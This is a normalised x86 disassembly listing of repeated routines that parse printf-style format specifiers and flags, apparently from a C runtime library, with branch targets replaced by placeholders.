mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp al 0x64
je r-xdata
cmp [ edx + 0x1 ] 0x34
jne r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp al 0x69
je r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x68
jne r-xdata
cmp al 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
inc eax
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
jne r-xdata
sub_42036c
mov al [ ecx + 0x31 ]
cmp al 0x46
jne r-xdata
cmp al 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_421661
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
movsx eax al
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
cmp eax 0x6c
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x6c
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
inc eax
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edx ]
cmp al 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp al 0x36
jne r-xdata
cmp [ edx + 0x1 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp al 0x64
je r-xdata
cmp [ edx + 0x1 ] 0x34
jne r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp al 0x69
je r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x68
jne r-xdata
cmp al 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
inc eax
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
jne r-xdata
sub_4204d5
mov al [ ecx + 0x31 ]
cmp al 0x46
jne r-xdata
cmp al 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_421890
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
movsx eax al
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
cmp eax 0x6c
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x6c
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
inc eax
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edx ]
cmp al 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp al 0x36
jne r-xdata
cmp [ edx + 0x1 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp al 0x64
je r-xdata
cmp [ edx + 0x1 ] 0x34
jne r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp al 0x69
je r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x68
jne r-xdata
cmp al 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
inc eax
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
jne r-xdata
sub_42063e
mov al [ ecx + 0x31 ]
cmp al 0x46
jne r-xdata
cmp al 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_421abf
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
movsx eax al
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
cmp eax 0x6c
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x6c
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
inc eax
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edx ]
cmp al 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp al 0x36
jne r-xdata
cmp [ edx + 0x1 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp al 0x64
je r-xdata
cmp [ edx + 0x1 ] 0x34
jne r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp al 0x69
je r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x68
jne r-xdata
cmp al 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
inc eax
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
jne r-xdata
sub_4207a7
mov al [ ecx + 0x31 ]
cmp al 0x46
jne r-xdata
cmp al 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_421cf9
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
movsx eax al
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
cmp eax 0x6c
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x6c
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
inc eax
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edx ]
cmp al 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp al 0x36
jne r-xdata
cmp [ edx + 0x1 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp al 0x64
je r-xdata
cmp [ edx + 0x1 ] 0x34
jne r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp al 0x69
je r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x68
jne r-xdata
cmp al 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
inc eax
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
jne r-xdata
sub_420910
movzx eax [ ecx + 0x32 ]
cmp eax 0x46
jne r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_421f28
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
push 0x6c
pop edx
cmp eax edx
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
add eax 0x2
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
movzx eax [ edx ]
cmp eax 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp eax 0x36
jne r-xdata
cmp [ edx + 0x2 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp eax 0x64
je r-xdata
cmp [ edx + 0x2 ] 0x34
jne r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
push 0x68
pop edx
cmp eax edx
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp eax 0x69
je r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
add eax 0x2
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp eax 0x75
je r-xdata
cmp eax 0x78
je r-xdata
cmp eax 0x58
jne r-xdata
sub_420a8c
movzx eax [ ecx + 0x32 ]
cmp eax 0x46
jne r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_422185
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
push 0x6c
pop edx
cmp eax edx
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
add eax 0x2
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
movzx eax [ edx ]
cmp eax 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp eax 0x36
jne r-xdata
cmp [ edx + 0x2 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp eax 0x64
je r-xdata
cmp [ edx + 0x2 ] 0x34
jne r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
push 0x68
pop edx
cmp eax edx
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp eax 0x69
je r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
add eax 0x2
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp eax 0x75
je r-xdata
cmp eax 0x78
je r-xdata
cmp eax 0x58
jne r-xdata
sub_420c08
movzx eax [ ecx + 0x32 ]
cmp eax 0x46
jne r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_4223f1
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
push 0x6c
pop edx
cmp eax edx
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
add eax 0x2
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
movzx eax [ edx ]
cmp eax 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp eax 0x36
jne r-xdata
cmp [ edx + 0x2 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp eax 0x64
je r-xdata
cmp [ edx + 0x2 ] 0x34
jne r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
push 0x68
pop edx
cmp eax edx
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp eax 0x69
je r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
add eax 0x2
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp eax 0x75
je r-xdata
cmp eax 0x78
je r-xdata
cmp eax 0x58
jne r-xdata
sub_420d84
movzx eax [ ecx + 0x32 ]
cmp eax 0x46
jne r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_42264e
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
push 0x6c
pop edx
cmp eax edx
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
add eax 0x2
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
movzx eax [ edx ]
cmp eax 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp eax 0x36
jne r-xdata
cmp [ edx + 0x2 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp eax 0x64
je r-xdata
cmp [ edx + 0x2 ] 0x34
jne r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
push 0x68
pop edx
cmp eax edx
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp eax 0x69
je r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
add eax 0x2
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp eax 0x75
je r-xdata
cmp eax 0x78
je r-xdata
cmp eax 0x58
jne r-xdata
sub_420f00
movzx eax [ ecx + 0x32 ]
cmp eax 0x46
jne r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_4228ab
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
push 0x6c
pop edx
cmp eax edx
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
add eax 0x2
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
movzx eax [ edx ]
cmp eax 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp eax 0x36
jne r-xdata
cmp [ edx + 0x2 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp eax 0x64
je r-xdata
cmp [ edx + 0x2 ] 0x34
jne r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
push 0x68
pop edx
cmp eax edx
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp eax 0x69
je r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
add eax 0x2
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp eax 0x75
je r-xdata
cmp eax 0x78
je r-xdata
cmp eax 0x58
jne r-xdata
sub_42107c
movzx eax [ ecx + 0x32 ]
cmp eax 0x46
jne r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_422b17
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
push 0x6c
pop edx
cmp eax edx
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
add eax 0x2
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
movzx eax [ edx ]
cmp eax 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp eax 0x36
jne r-xdata
cmp [ edx + 0x2 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp eax 0x64
je r-xdata
cmp [ edx + 0x2 ] 0x34
jne r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
push 0x68
pop edx
cmp eax edx
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp eax 0x69
je r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
add eax 0x2
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp eax 0x75
je r-xdata
cmp eax 0x78
je r-xdata
cmp eax 0x58
jne r-xdata
sub_4211f8
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
xor ecx ecx
movsx eax [ esi + 0x31 ]
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax 0x58
jg r-xdata
mov ecx esi
call sub_4267d5
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_4266b5
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
xor al al
jmp r-xdata
push ecx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_42360b
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_4230f7
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
cmp eax 0x41
je r-xdata
mov edx [ esi + 0x20 ]
xor eax eax
push edi
mov [ ebp - 0x4 ] ax
mov edi eax
mov [ ebp - 0x2 ] al
mov eax edx
shr eax 0x4
test bl al
je r-xdata
mov al bl
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_424fd5
jmp r-xdata
cmp eax 0x43
je r-xdata
mov cl [ esi + 0x31 ]
cmp cl 0x78
je r-xdata
mov eax edx
shr eax 0x6
test bl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_425f3d
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ecx
mov ecx esi
call sub_4247af
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test bl al
jne r-xdata
cmp cl 0x58
jne r-xdata
test bl dl
je r-xdata
mov [ ebp - 0x4 ] 0x2d
jmp r-xdata
mov ecx esi
call sub_426541
jmp r-xdata
cmp eax 0x47
jle r-xdata
cmp cl 0x61
je r-xdata
xor bl bl
mov eax edx
shr eax 0x1
test bl al
je r-xdata
mov [ ebp - 0x4 ] 0x2b
jmp r-xdata
mov edi ebx
cmp eax 0x53
jne r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp + edi - 0x4 ] 0x30
cmp cl 0x58
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov ebx [ esi + 0x24 ]
sub ebx [ esi + 0x38 ]
sub ebx edi
test dl 0xc
jne r-xdata
test bl bl
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_4289e4
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c4b3
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_4282b8
cmp [ edi ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
mov [ ebp + edi - 0x3 ] al
add edi 0x2
mov al 0x1
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c4b3
add esp 0x10
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c4b3
add esp 0x10
sub_421427
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
xor ecx ecx
movsx eax [ esi + 0x31 ]
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax 0x58
jg r-xdata
mov ecx esi
call sub_426848
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_4266cd
jmp r-xdata
